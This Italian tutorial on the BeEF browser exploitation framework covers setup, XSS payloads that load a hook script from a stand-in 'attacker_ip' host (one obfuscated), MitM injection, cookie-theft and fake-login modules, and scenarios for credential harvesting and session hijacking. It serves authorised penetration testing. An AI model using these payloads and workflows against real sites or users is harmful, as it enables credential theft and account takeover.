# BeEF - Browser Exploitation Framework

## Scopo

Questa guida copre BeEF (Browser Exploitation Framework), un potente strumento di penetration testing che si concentra sullo sfruttamento del browser web. BeEF permette di testare la sicurezza lato client e valutare l'impatto di vulnerabilità XSS.

## Prerequisiti

- Kali Linux o distribuzione con Ruby
- Browser moderno per l'interfaccia di gestione
- Accesso alla rete target
- **Autorizzazione scritta** per i test
- Conoscenza di base di JavaScript e web security

## Installazione

```bash
# Su Kali Linux (preinstallato)
sudo beef-xss

# Installazione manuale
git clone https://github.com/beefproject/beef.git
cd beef
./install
```

---

## Avvio

```bash
# Avvio standard
sudo beef-xss

# Primo avvio - cambia password di default
# Username: beef
# Password: beef (da cambiare!)
```

### URL Principali

- **Pannello di controllo**: `http://localhost:3000/ui/panel`
- **Hook script**: `http://localhost:3000/hook.js`
- **Demo page**: `http://localhost:3000/demos/butcher/index.html`

---

## Configurazione

File: `/usr/share/beef-xss/config.yaml`

```yaml
beef:
    version: '0.5.4.0'
    debug: false
    
    credentials:
        user: "beef"
        passwd: "strong_password"  # Cambia!
    
    http:
        host: "0.0.0.0"
        port: "3000"
        public: ""  # IP pubblico se dietro NAT
        
    database:
        driver: sqlite
```

---

## Hook dei Browser

### Script Hook Base

```html
<script src="http://attacker_ip:3000/hook.js"></script>
```

### Iniezione via XSS

```javascript
// Stored XSS
<script src="http://attacker_ip:3000/hook.js"></script>

// Reflected XSS in URL
http://vulnerable.com/search?q=<script src="http://attacker_ip:3000/hook.js"></script>

// Obfuscated
<script>
var s=document.createElement('script');
s.src='http://attacker_ip:3000/hook.js';
document.body.appendChild(s);
</script>
```

### Iniezione via MitM

```bash
# Con Bettercap
set http.proxy.script beef-inject.js
http.proxy on
```

---

## Moduli BeEF

### Information Gathering

```
Browser Fingerprinting
├── Get Cookie
├── Get System Info
├── Get Geolocation
├── Get Internal IP (WebRTC)
├── Get Visited URLs
└── Detect Browser Plugins
```

### Social Engineering

```
Social Engineering
├── Pretty Theft (Fake Login Dialogs)
├── Simple Hijacker
├── Fake Flash Update
├── Fake Notification Bar
├── Google Phishing
└── TabNabbing
```

**Pretty Theft Example**:

```
Module: Pretty Theft
Target: All hooked browsers
Options:
  - Phishing Dialog: Facebook Login
  - Custom Logo: URL
```

### Network Discovery

```
Network
├── Ping Sweep
├── Port Scanner
├── DNS Enumeration
├── Get HTTP Servers
└── Fingerprint Network
```

**Esempio Port Scanner**:

```
Module: Port Scanner
Target: 192.168.1.1
Ports: 21,22,23,80,443,445,3389,8080
```

### Exploits

```
Exploits
├── Browser Exploits
├── Local Host Exploits
├── Router Exploits
└── Metasploit Integration
```

### Persistence

```
Persistence
├── Confirm Close Tab
├── Create Pop Under
├── Man in the Browser
└── Create Foreground iFrame
```

---

## Integrazione con Metasploit

### Configurazione

```yaml
# In config.yaml
extension:
    metasploit:
        enable: true
        host: "127.0.0.1"
        port: 55552
        user: "msf"
        pass: "abc123"
```

### Avvio Metasploit

```bash
# Avvia Metasploit RPC
msfconsole
msf> load msgrpc Pass=abc123
```

### Utilizzo

```
1. Seleziona browser hooked
2. Commands > Metasploit
3. Scegli exploit browser appropriato
4. Configura payload
5. Esegui
```

---

## API RESTful

### Autenticazione

```bash
# Ottieni token
curl -H "Content-Type: application/json" \
     -d '{"username":"beef","password":"password"}' \
     http://localhost:3000/api/admin/login
```

### Esempi API

```bash
# Lista browser hooked
curl "http://localhost:3000/api/hooks?token=TOKEN"

# Info browser specifico
curl "http://localhost:3000/api/hooks/SESSION_ID?token=TOKEN"

# Esegui modulo
curl -H "Content-Type: application/json" \
     -d '{"mod_id":1,"mod_params":{}}' \
     "http://localhost:3000/api/modules/SESSION_ID/1?token=TOKEN"
```

---

## Scenari di Attacco

### Scenario 1: Credential Harvesting

1. Trova vulnerabilità XSS nel sito target
2. Inietta hook.js
3. Attendi connessioni al pannello BeEF
4. Esegui modulo "Pretty Theft" (es. Facebook Login)
5. Raccogli credenziali inserite dalla vittima

### Scenario 2: Internal Network Mapping

1. Hooked browser nella rete interna
2. Esegui "Get Internal IP" per identificare subnet
3. Lancia "Ping Sweep" sulla subnet
4. Esegui "Port Scanner" sugli host trovati
5. Identifica servizi vulnerabili

### Scenario 3: Session Hijacking

1. Hook browser autenticato
2. Esegui "Get Cookie"
3. Estrai session cookie
4. Importa cookie nel tuo browser
5. Accedi alla sessione della vittima

---

## Workflow Operativo

1. **Setup**: Configura BeEF e assicurati che sia raggiungibile
2. **Injection**: Trova un vettore per iniettare hook.js
3. **Hooking**: Attendi che le vittime visitino la pagina
4. **Reconnaissance**: Raccogli informazioni sui browser hooked
5. **Attack**: Esegui moduli appropriati per gli obiettivi
6. **Persistence**: Mantieni l'accesso se necessario
7. **Documentation**: Registra tutte le attività e i risultati

---

## Best Practices

- **Scope definito**: Opera solo sui target autorizzati
- **SSL/TLS**: Usa HTTPS per hook.js in ambienti con HSTS
- **Obfuscation**: Offusca lo script hook per evitare detection
- **Logging**: Abilita log dettagliati per il report
- **Cleanup**: Rimuovi tutti gli hook dopo il test
- **Privacy**: Non raccogliere dati oltre lo scope del test
- **Ethical use**: Usa solo per penetration testing autorizzato

## Riferimenti

- [BeEF GitHub](https://github.com/beefproject/beef)
- [BeEF Wiki](https://github.com/beefproject/beef/wiki)
- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [Browser Security Handbook](https://code.google.com/archive/p/browsersec/)
